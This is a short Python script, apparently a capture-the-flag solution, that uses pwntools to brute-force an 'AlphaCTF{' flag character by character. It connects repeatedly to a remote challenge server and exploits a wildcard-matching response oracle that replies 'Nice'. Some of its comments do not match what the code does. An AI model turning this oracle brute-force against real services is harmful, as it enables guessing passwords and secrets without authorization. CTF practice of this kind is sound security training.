#!/usr/share/python

import string
import subprocess
import os
from pwn import *

# Generate a list of all ASCII letters and digits
all1 = list(string.ascii_letters + string.digits)
all1 = list(string.printable)
all1.remove("*")
# Initialize variables
password = "AlphaCTF{"
found = False

# Print the list of characters being tested
print(all1)

# Continue the loop until the password is found
while not found:
# Iterate through each character in the list
    for char in all1:
# Construct a command to execute a script with a guessed password
        p=remote(host="35.228.220.66", port=1305)
        p.recv()
        p.sendline((password + char + "*").encode())
        a = p.recv()
# Run the command and capture the output
        if b"Nice" in a:
# If confirmed, update the password and print it
            password += char
            print(password)
            break
    else:
# If the loop completes without finding the correct password, set found to True
        found = True
